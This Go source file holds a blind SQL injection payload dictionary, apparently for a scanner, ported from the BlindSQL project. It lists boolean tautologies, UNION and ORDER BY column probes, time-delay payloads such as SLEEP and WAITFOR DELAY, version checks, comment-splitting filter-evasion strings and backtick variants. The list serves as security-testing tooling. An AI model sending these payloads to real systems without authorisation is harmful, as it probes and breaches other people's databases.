// 内置盲注 payload 字典，移植自 BlindSQL 项目 payload.txt 的常用族代表性子集。
// 原始字符串内不含反引号；反引号族与其余条目通过 defaultBacktickPayloads 追加。
package payloads

import "strings"

// defaultPayloadRaw 是内置字典主体，每行一个 payload。
const defaultPayloadRaw = `
'
"
1
0
1'
1"
1)
1-
1-- 
1/*
1/**/
1%00
1%0a
1%0b
1;%00
' OR '1'='1
' or '1'='1
" OR "1"="1
" or "1"="1
1 OR 1=1
1 OR 1=2
1 or 1=1
1 or 1=2
1 AND 1=1
1 AND 1=2
1 and 1=1
1 and 1=2
1' OR '1'='1
1' or '1'='1
1' AND '1'='1
1' and '1'='1
1" OR "1"="1
1" or "1"="1
1" AND "1"="1
1" and "1"="1
1' OR 'a'='a
1' AND 'a'='b
1" OR 'a'='a
1" AND 'a'='b
1'||'1'||'
1'||'x'||'
"1"||"1"||"
"1"||"x"||"
'1'||'1'||'
'1'||'x'||'
1' OR 1=1--
1' OR 1=1#
1' OR 1=1/*
1 OR 1=1--
1 OR 1=1#
1 OR 1=1/*
1" OR 1=1--
1" OR 1=1#
1" OR 1=1/*
1' AND 1=1--
1' AND 1=2--
1 AND 1=1--
1 AND 1=2--
1" AND 1=1--
1" AND 1=2--
1/**/OR/**/1=1
1/**/AND/**/1=1
S/**/ELECT
U/**/NION
A/**/ND
O/**/R
S/**/E/**/L/**/E/**/C/**/T
U/**/N/**/I/**/O/**/N
1'||'a'='a
1'||'a'='b
1"||'a'='a
1"||'a'='b
1'&&'a'='a
1'&&'a'='b
1"&&'a'='a
1"&&'a'='b
1' OR 'a'='a'#
1' OR 'a'='b'#
1" OR 'a'='a'#
1" OR 'a'='b'#
1' AND 'a'='a'#
1' AND 'a'='b'#
1" AND 'a'='a'#
1" AND 'a'='b'#
1 ORDER BY 1
1 ORDER BY 2
1 ORDER BY 3
1 ORDER BY 4
1 ORDER BY 5
1 ORDER BY 10
1 ORDER BY 20
1 ORDER BY 50
1' ORDER BY 1--
1' ORDER BY 2--
1" ORDER BY 1--
1" ORDER BY 2--
1 UNION SELECT NULL
1 UNION ALL SELECT NULL
1 UNION SELECT NULL,NULL
1 UNION SELECT NULL,NULL,NULL
1 UNION SELECT NULL,NULL,NULL,NULL
1 UNION SELECT NULL,NULL,NULL,NULL,NULL
1' UNION SELECT NULL--
1' UNION ALL SELECT NULL--
1" UNION SELECT NULL--
1" UNION ALL SELECT NULL--
1' UNION SELECT NULL,NULL--
1" UNION SELECT NULL,NULL--
1 UNION SELECT NULL FROM dual
1 AND (SELECT 1)=1
1' AND (SELECT 1)=1--
1 AND 1=(SELECT 1 FROM dual)
1' AND 1=(SELECT 1 FROM dual)--
1 AND SLEEP(1)
1 AND SLEEP(5)
1' AND SLEEP(1)--
1' AND SLEEP(5)--
1" AND SLEEP(1)--
1 AND IF(1=1,SLEEP(1),0)
1' AND IF(1=1,SLEEP(1),0)--
1 AND BENCHMARK(1000000,MD5(1))
1' AND BENCHMARK(1000000,MD5(1))--
1;SELECT pg_sleep(1)
1';SELECT pg_sleep(1)--
1;WAITFOR DELAY '0:0:1'
1';WAITFOR DELAY '0:0:1'--
1 AND @@VERSION IS NOT NULL
1' AND @@VERSION IS NOT NULL--
1 AND sqlite_version() IS NOT NULL
1' AND sqlite_version() IS NOT NULL--
1 UNION SELECT sqlite_version()
1 UNION SELECT @@VERSION
CONCAT('1','1')
CONCAT('1','x')
concat('1','1')
concat('1','x')
CONCAT('1','test')
concat('1','test')
CAST('x' AS INTEGER)
1/*!50000 AND 1=1*/
1'/*!50000 OR 1=1*/--
1' OR 1=1/*!
1' AND 1=1/*!
1' OR 1=1/*!*!
1' AND 1=1/*!*!
) OR (1=1-- 
) OR (1=2-- 
) AND (1=1-- 
) AND (1=2-- 
') OR (1=1-- 
') OR (1=2-- 
') AND (1=1-- 
') AND (1=2-- 
1' OR 2<1
1' OR 2>1
1' AND 2<1
1' AND 2>1
1' OR 1!=0
1' AND 1<>0
0 OR 1=1
0 OR 1=2
0 AND 1=1
0 AND 1=2
1 AND 1/0
1' AND 1/0-- 
1'\nOR 1=1
1'\nAND 1=1
1'\rOR 1=1
1'\rAND 1=1
1%0aOR 1=1
1%0bAND 1=1
NULL
1'-- 
1"/*!
1'/*!
1/*'*/
`

/*
defaultPayloads 返回内置字典的完整列表：主体加反引号族。

参数:
  - 无。

返回:
  - []string: 去空白后的 payload 列表。
*/
func defaultPayloads() []string {
	payloads := make([]string, 0, 256)
	for _, line := range strings.Split(defaultPayloadRaw, "\n") {
		line = strings.TrimSuffix(line, "\r")
		if strings.TrimSpace(line) == "" {
			continue
		}
		payloads = append(payloads, line)
	}
	payloads = append(payloads, backtickPayloads()...)
	return payloads
}

/*
backtickPayloads 返回反引号闭合族的 payload，独立于原始字符串常量。

参数:
  - 无。

返回:
  - []string: 反引号族 payload 列表。
*/
func backtickPayloads() []string {
	return []string{
		"1`",
		"1` OR 1=1",
		"1` OR 1=2",
		"1` AND 1=1",
		"1` AND 1=2",
		"1` OR 1=1--",
		"1` AND 1=1--",
		"1` OR 'a'='a",
		"1` AND 'a'='b",
		"1`||'a'='a",
		"1`||'a'='b",
		"1`&&'a'='a",
		"1`&&'a'='b",
		"1` UNION SELECT NULL--",
		"1` AND SLEEP(1)--",
	}
}
